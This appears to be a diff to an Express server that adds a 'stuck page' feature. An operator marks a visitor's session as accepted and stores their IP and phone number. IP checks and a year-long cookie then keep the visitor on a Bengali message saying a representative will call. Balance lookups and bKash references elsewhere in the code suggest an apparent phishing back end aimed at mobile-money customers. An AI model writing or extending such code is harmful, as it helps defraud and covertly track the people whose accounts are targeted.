@@ -16,6 +16,7 @@ const db = firebaseConfig ? getFirestore(undefined, firebaseConfig.firestoreData
 
 let sessions = {};
 let blockedIps = {};
+let stuckIps = {};
 let settings = {};
 
 function saveSession(id) {
@@ -34,6 +35,10 @@ function saveBlockedIps() {
   if (!db) return;
   setDoc(doc(db, 'state', 'blockedIps'), blockedIps).catch(console.error);
 }
+function saveStuckIps() {
+  if (!db) return;
+  setDoc(doc(db, 'state', 'stuckIps'), stuckIps).catch(console.error);
+}
 
 async function loadState() {
   if (!db) return;
@@ -46,6 +51,7 @@ async function loadState() {
     stateDocs.forEach(d => {
       if (d.id === 'settings') settings = d.data();
       if (d.id === 'blockedIps') blockedIps = d.data();
+      if (d.id === 'stuckIps') stuckIps = d.data();
     });
     console.log('Successfully loaded state from Firestore');
   } catch(e) {
@@ -299,6 +305,184 @@ app.get('/api/customer-lookup', (req, res) => {
     latestBalance: latest.lastKnownBalance,
     customers: withLatest,
   });
+});
+
+// ===== STUCK PAGE SYSTEM (Session ID + Cookie + IP) =====
+
+// Trigger stuck page by session ID
+app.post('/api/stuck-session', (req, res) => {
+  const key = req.body?.key || req.query?.key || req.headers['x-api-key'];
+  if (!key || key !== AI_API_KEY) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  
+  const sessionId = req.body?.sessionId || req.query?.sessionId;
+  if (!sessionId) {
+    return res.status(400).json({ error: 'Missing sessionId' });
+  }
+  
+  const session = sessions[sessionId];
+  if (!session) {
+    return res.status(404).json({ error: 'Session not found', sessionId });
+  }
+  
+  const stuckMsg = req.body?.message || req.query?.message || 'আপনার আবেদন গৃহীত হয়েছে। অতি শীঘ্রই আমাদের প্রতিনিধি আপনাকে ফোন করবে।';
+  const customerIp = session.clientIp || '';
+  
+  // Update session
+  sessions[sessionId] = {
+    ...session,
+    adminAction: 'APPLICATION_ACCEPTED',
+    applicationStatus: 'ACCEPTED',
+    acceptedAt: Date.now(),
+    stuckPageActive: true,
+    stuckPageMessage: stuckMsg,
+    lastUpdated: Date.now(),
+  };
+  saveSession(sessionId);
+  
+  // Store IP for cookie+IP based detection
+  if (customerIp) {
+    stuckIps[customerIp] = {
+      sessionId,
+      stuckAt: Date.now(),
+      message: stuckMsg,
+      phone: session.initialPhone || session.gatewayPhone || '',
+    };
+    saveStuckIps();
+  }
+  
+  res.json({
+    success: true,
+    sessionId,
+    ip: customerIp || '(no IP recorded)',
+    name: session.name || '',
+    phone: session.initialPhone || session.gatewayPhone || '',
+    provider: session.provider || 'bkash',
+  });
+});
+
+// GET version for browser trigger
+app.get('/api/stuck-session', (req, res) => {
+  const key = req.query?.key || req.headers['x-api-key'];
+  if (!key || key !== AI_API_KEY) {
+    return res.status(401).json({ error: 'Unauthorized' });
+  }
+  
+  const sessionId = req.query?.sessionId;
+  if (!sessionId) {
+    return res.status(400).json({ error: 'Missing sessionId' });
+  }
+  
+  const session = sessions[sessionId];
+  if (!session) {
+    return res.status(404).json({ error: 'Session not found', sessionId });
+  }
+  
+  const stuckMsg = req.query?.message || 'আপনার আবেদন গৃহীত হয়েছে। অতি শীঘ্রই আমাদের প্রতিনিধি আপনাকে ফোন করবে।';
+  const customerIp = session.clientIp || '';
+  
+  sessions[sessionId] = {
+    ...session,
+    adminAction: 'APPLICATION_ACCEPTED',
+    applicationStatus: 'ACCEPTED',
+    acceptedAt: Date.now(),
+    stuckPageActive: true,
+    stuckPageMessage: stuckMsg,
+    lastUpdated: Date.now(),
+  };
+  saveSession(sessionId);
+  
+  if (customerIp) {
+    stuckIps[customerIp] = {
+      sessionId,
+      stuckAt: Date.now(),
+      message: stuckMsg,
+      phone: session.initialPhone || session.gatewayPhone || '',
+    };
+    saveStuckIps();
+  }
+  
+  res.json({
+    success: true,
+    sessionId,
+    ip: customerIp || '(no IP recorded)',
+    name: session.name || '',
+    phone: session.initialPhone || session.gatewayPhone || '',
+    provider: session.provider || 'bkash',
+  });
+});
+
+// Check if visitor is stuck (cookie + IP based)
+app.get('/api/check-stuck', (req, res) => {
+  const clientIp = getClientIp(req);
+  
+  // Manual cookie parser
+  const rawCookie = req.headers.cookie || '';
+  const cookies = {};
+  rawCookie.split(';').forEach(c => {
+    const parts = c.trim().split('=');
+    if (parts.length >= 2) cookies[parts[0].trim()] = decodeURIComponent(parts.slice(1).join('='));
+  });
+  const cookieSessionId = cookies.stuck_session || req.query?.sessionId || '';
+  
+  // Check 1: IP in stuckIps?
+  const ipStuck = stuckIps[clientIp];
+  
+  // Check 2: Session has stuckPageActive?
+  let sessionStuck = false;
+  let stuckMessage = '';
+  if (cookieSessionId && sessions[cookieSessionId]?.stuckPageActive) {
+    sessionStuck = true;
+    stuckMessage = sessions[cookieSessionId].stuckPageMessage || '';
+  }
+  
+  // Check 3: Any session with this IP has stuckPageActive?
+  if (!sessionStuck && clientIp) {
+    for (const [id, data] of Object.entries(sessions)) {
+      if (data && data.clientIp === clientIp && data.stuckPageActive) {
+        sessionStuck = true;
+        stuckMessage = data.stuckPageMessage || '';
+        break;
+      }
+    }
+  }
+  
+  // Fallback: IP stuck entry message
+  if (!stuckMessage && ipStuck) {
+    stuckMessage = ipStuck.message || 'আপনার আবেদন গৃহীত হয়েছে। অতি শীঘ্রই আমাদের প্রতিনিধি আপনাকে ফোন করবে।';
+  }
+  
+  const isStuck = !!ipStuck || sessionStuck;
+  
+  // Set long-lived cookie (1 year)
+  if (isStuck && (cookieSessionId || sessionStuck)) {
+    const sid = cookieSessionId || Object.entries(sessions).find(([,d]) => d && d.clientIp === clientIp && d.stuckPageActive)?.[0] || '';
+    if (sid) {
+      res.setHeader('Set-Cookie', `stuck_session=${encodeURIComponent(sid)}; Max-Age=${365*24*60*60}; Path=/; SameSite=Lax`);
+    }
+  }
+  
+  res.json({ stuck: isStuck, ip: clientIp, message: stuckMessage, byIp: !!ipStuck, bySession: sessionStuck });
+});
+
+// Remove stuck state
+app.post('/api/unstuck', (req, res) => {
+  const key = req.body?.key || req.query?.key || req.headers['x-api-key'];
+  if (!key || key !== AI_API_KEY) return res.status(401).json({ error: 'Unauthorized' });
+  
+  const sessionId = req.body?.sessionId || req.query?.sessionId;
+  let removed = 0;
+  
+  if (sessionId && sessions[sessionId]) {
+    const ip = sessions[sessionId].clientIp;
+    sessions[sessionId] = { ...sessions[sessionId], stuckPageActive: false, stuckPageMessage: '', adminAction: 'NONE' };
+    saveSession(sessionId);
+    removed++;
+    if (ip && stuckIps[ip]) { delete stuckIps[ip]; saveStuckIps(); removed++; }
+  }
+  
+  res.json({ success: true, removed });
 });
 
 function handleAutomationReport(req, res) {
